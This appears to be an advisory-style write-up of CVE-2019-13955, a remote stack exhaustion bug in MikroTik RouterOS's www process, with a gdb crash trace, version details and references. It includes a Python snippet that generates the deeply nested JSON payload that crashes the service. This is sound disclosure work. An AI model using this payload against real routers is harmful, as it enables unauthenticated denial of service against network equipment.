### CVE-2019-13955

#### Description

The `www` process suffers from a stack exhaustion vulnerability. By sending a crafted packet to the `www` process, an unauthenticated remote user can trigger a stack exhaustion vulnerability via recursive parsing of `JSON` containing message type M.

Based on the [`routeros`](https://github.com/tenable/routeros) repository, the main part of crafted message can be generated with a simple python code snippet.

```python
msg = "{M01:[M01:[]]}"
for _ in xrange(2000):
    msg = msg.replace('[]', "[M01:[]]")
```

Against long-term `6.43.16`, the poc resulted in the following crash captured by `gdb`.

```shell
(gdb) c
Continuing.
Reading /nova/lib/www/jsproxy.p from remote target...
Reading /lib/libucrypto.so from remote target...
[New Thread 279.366]

Thread 2 "www" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 279.366]
=> 0x7746792f:  call   0x774661a9
   0x77467934:  add    ebx,0x5028
   0x7746793a:  mov    DWORD PTR [ebp-0x3c],eax
   0x7746793d:  mov    DWORD PTR [ebp-0x44],edx
0x7746792f in ?? () from target:/nova/lib/www/jsproxy.p
(gdb) info inferiors
  Num  Description       Executable
* 1    process 279       target:/nova/bin/www
(gdb) bt
#0  0x7746792f in ?? () from target:/nova/lib/www/jsproxy.p
#1  0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#2  0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#3  0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#4  0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#5  0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#6  0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#7  0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#8  0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#9  0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#10 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#11 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#12 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#13 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#14 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#15 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#16 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#17 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#18 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#19 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#20 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#21 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#22 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#23 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
#24 0x774682a3 in ?? () from target:/nova/lib/www/jsproxy.p
...
```

The poc is available at [CVE-2019-13955](https://github.com/tenable/routeros/blob/master/poc/cve_2019_13955/src/main.cpp).

#### Affected Version

This vulnerability was initially found in long-term  `6.42.11`, and was fixed since stable `6.45.1`.

### References

+ [Two vulnerabilities found in MikroTik's RouterOS](https://seclists.org/fulldisclosure/2019/Jul/20)
+ [CVE-2019-13955](https://github.com/tenable/routeros/tree/master/poc/cve_2019_13955)
+ [routeros](https://github.com/tenable/routeros)
+ [CVE-2018-1158 MikroTik RouterOS漏洞分析之发现CVE-2019-13955](https://cq674350529.github.io/2019/08/15/CVE-2018-1158-MikroTik-RouterOS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E5%8F%91%E7%8E%B0CVE-2019-13955/)





